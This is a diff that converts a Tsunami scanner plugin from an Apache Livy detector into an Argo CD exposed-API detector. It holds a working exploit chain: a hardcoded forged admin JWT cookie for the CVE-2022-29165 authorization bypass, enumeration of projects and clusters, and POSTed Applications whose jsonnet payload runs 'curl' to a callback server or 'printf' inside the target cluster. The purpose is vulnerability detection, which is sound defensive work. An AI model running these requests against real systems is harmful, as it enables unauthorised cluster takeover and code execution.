@@ -7,22 +7,34 @@
 
 info: {
   type: VULN_DETECTION
-  name: "ApacheLivy_ExposedUI"
-  author: "joernNNN"
-  version: "0.1"
+  name: "ArgoCD_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    "JamesFoxxx for the original Java version"
+  version: "2.0"
 }
 
 finding: {
   main_id: {
-    publisher: "GOOGLE"
-    value: "APACHELIVY_EXPOSED_UI"
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "ARGOCD_EXPOSED_UI"
   }
-  title: "Apache Livy Exposed instance"
-  description: "Apache Livy instance is exposed and can be used to compromise the system."
+  title: "Exposed Argo CD API Server"
+  description: 
+    "Argo CD API server is publicly exposed without any authentication. It allows"
+    " attackers to access kubernetes clusters. Attackers can change parameters of"
+    " clusters and run arbitrary containers. This plugin also provides a cookie "
+    " associated with CVE-2022-29165, which allows anonymous users to impersonate "
+    " the admin user (authorization bypass), in cases where anonymous user permiss"
+    "ions have been reduced but the instance is vulnerable to CVE-2022-29165. Note"
+    " that this does not necessarily mean that the server is vulnerable to CVE-202"
+    "2-29165, it specifically detects cases where a high privileged role is access"
+    "ible without authentication. This vulnerability was confirmed by running a ne"
+    "w application in the  cluster, which should have also been deleted afterward "
+    "automatically. "
   recommendation:
-    "Configure authentication or ensure the Apache Livy instance is not exposed "
-    "to the network. See "
-    "https://livy.apache.org/get-started/ for details."
+    "Please disable anonymous access to your Argo CD API server and ensure that it is "
+    "updated to the latest version."
   severity: CRITICAL
 }
 
@@ -30,17 +42,20 @@ finding: {
 # ACTIONS #
 ###########
 
-# TODO: fingerprint
+config: {}
 
 actions: {
   name: "argocd_exposed_ui_fingerprint"
   http_request: {
     method: GET
-    uri: "/ui"
+    uri: "/"
+    headers: [
+      { name: "Cookie" value: "{{ COOKIE }}" }
+    ]
     response: {
       http_status: 200
       expect_all: {
-        conditions: { body {} contains: '<title>Livy - Sessions</title>' }
+        conditions: { body {} contains: '<title>Argo CD</title>' }
       }
     }
   }
@@ -51,6 +66,9 @@ actions: {
   http_request: {
     method: GET
     uri: "/api/v1/projects?fields=items.metadata.name"
+    headers: [
+      { name: "Cookie" value: "{{ COOKIE }}" }
+    ]
     response: {
       http_status: 200
       expect_all: {
@@ -60,7 +78,7 @@ actions: {
         patterns: [
           {
             from_body: {}
-            regexp: "\"name\":\"[\"]+\","
+            regexp: '"name":"([^"]+)"'
             variable_name: "PROJECT_NAME"
           }
         ]
@@ -74,6 +92,9 @@ actions: {
   http_request: {
     method: GET
     uri: "/api/v1/clusters"
+    headers: [
+      { name: "Cookie" value: "{{ COOKIE }}" }
+    ]
     response: {
       http_status: 200
       expect_all: {
@@ -83,7 +104,7 @@ actions: {
         patterns: [
           {
             from_body: {}
-            regexp: "\"name\":\"[\"]+\","
+            regexp: '"server":"([^"]+)"'
             variable_name: "CLUSTER_NAME"
           }
         ]
@@ -92,28 +113,140 @@ actions: {
   }
 }
 
-
-
-
+# TODO: check if namespace needs to be changed for other k8s configs.
+actions: {
+  name: "create_application_oob"
+  http_request: {
+    method: POST
+    uri: "/api/v1/applications?upsert=true"
+    data:
+      "{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"Application\","
+      "\"metadata\":{\"name\":\"tsunami-security-scanner-{{ T_UTL_CURRENT_TIMESTAMP_MS }}\"},\"spec\""
+      ":{\"destination\":{\"name\":\"\",\"namespace\":"
+      "\"tsunami-security-scanner-2\",\"server\":"
+      "\"{{ CLUSTER_NAME }}\"},\"source\":{\"path\":"
+      "\"{{ PAYLOAD_PATH }}\",\"repoURL\":"
+      "\"{{ REPO_URL }}\",\"targetRevision\":"
+      "\"HEAD\",\"directory\":{\"jsonnet\":{\"tlas\":[{\"name\":"
+      "\"payload\",\"value\":"
+      "\"\\\"curl {{ T_CBS_URI }}\\\"\""
+      ",\"code\":true}]}}},\"sources\":[],\"project\":\"{{ PROJECT_NAME }}\","
+      "\"syncPolicy\":{\"automated\":{\"prune\":false,"
+      "\"selfHeal\":false}}}}"
+    headers: [
+      { name: "Cookie" value: "{{ COOKIE }}" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+  }
+  cleanup_actions: "delete_application"
+}
 
 actions: {
-  name: "sleep_for_callback"
-  utility: { sleep: { duration_ms: 4000 } }
+  name: "create_application_reflective"
+  http_request: {
+    method: POST
+    uri: "/api/v1/applications?upsert=true"
+    data:
+      "{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"Application\","
+      "\"metadata\":{\"name\":\"tsunami-security-scanner-{{ T_UTL_CURRENT_TIMESTAMP_MS }}\"},\"spec\""
+      ":{\"destination\":{\"name\":\"\",\"namespace\":"
+      "\"tsunami-security-scanner-2\",\"server\":"
+      "\"{{ CLUSTER_NAME }}\"},\"source\":{\"path\":"
+      "\"{{ PAYLOAD_PATH }}\",\"repoURL\":"
+      "\"{{ REPO_URL }}\",\"targetRevision\":"
+      "\"HEAD\",\"directory\":{\"jsonnet\":{\"tlas\":[{\"name\":"
+      "\"payload\",\"value\":"
+      "\"\\\"printf %x 133713371337\\\"\""
+      ",\"code\":true}]}}},\"sources\":[],\"project\":\"{{ PROJECT_NAME }}\","
+      "\"syncPolicy\":{\"automated\":{\"prune\":false,"
+      "\"selfHeal\":false}}}}"
+    headers: [
+      { name: "Cookie" value: "{{ COOKIE }}" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+  }
+  cleanup_actions: "delete_application"
+}
+
+# this is long but it may be needed because the docker image needs to be downloaded and started
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 20000 } }
 }
 actions: {
   name: "check_callback_server_logs"
   callback_server: { action_type: CHECK }
 }
 
+
+actions: {
+  name: "delete_application"
+  http_request: {
+    method: DELETE
+    uri: "/api/v1/applications/tsunami-security-scanner-{{ T_UTL_CURRENT_TIMESTAMP_MS }}?cascade=true&propagationPolicy=foreground&appNamespace=argocd"
+    headers: [
+      { name: "Cookie" value: "{{ COOKIE }}" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: '{}'
+  }
+}
+
+# Since the curl and nginx docker images are downloaded from the hosted payload, we know it executed
+
+actions: {
+  name: "check_payload_executed_reflective"
+  http_request: {
+    method: GET
+    uri: "/api/v1/applications/tsunami-security-scanner-{{ T_UTL_CURRENT_TIMESTAMP_MS }}?appNamespace=argocd"
+    headers: [
+      { name: "Cookie" value: "{{ COOKIE }}" }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: { body {} contains: 'curlimages/curl:7.78.0' },
+        conditions: { body {} contains: 'nginx:1.24' },
+        conditions: { body {} contains: '133713371337' }
+      }
+    }
+  }
+}
+
+
 #############
 # WORKFLOWS #
 #############
 
 workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  variables: [
+    { name: "PAYLOAD_PATH" value: "payloads/argo-cd-exposed-ui" },
+    { name: "REPO_URL" value: "https://github.com/google/tsunami-security-scanner-plugins" },
+    { name: "COOKIE" value: "argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ" }
+  ]
   actions: [
-    "livy_exposed_ui_fingerprint",
-    "create_batches",
-    "sleep_for_callback",
+    "argocd_exposed_ui_fingerprint",
+    "get_project",
+    "get_cluster",
+    "create_application_oob",
+    "sleep",
     "check_callback_server_logs"
+  ]
+}
+
+workflows: {
+  variables: [
+    { name: "PAYLOAD_PATH" value: "payloads/argo-cd-exposed-ui" },
+    { name: "REPO_URL" value: "https://github.com/google/tsunami-security-scanner-plugins" },
+    { name: "COOKIE" value: "argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ" }
+  ]
+  actions: [
+    "argocd_exposed_ui_fingerprint",
+    "get_project",
+    "get_cluster",
+    "create_application_reflective",
+    "sleep",
+    "check_payload_executed_reflective"
   ]
 }
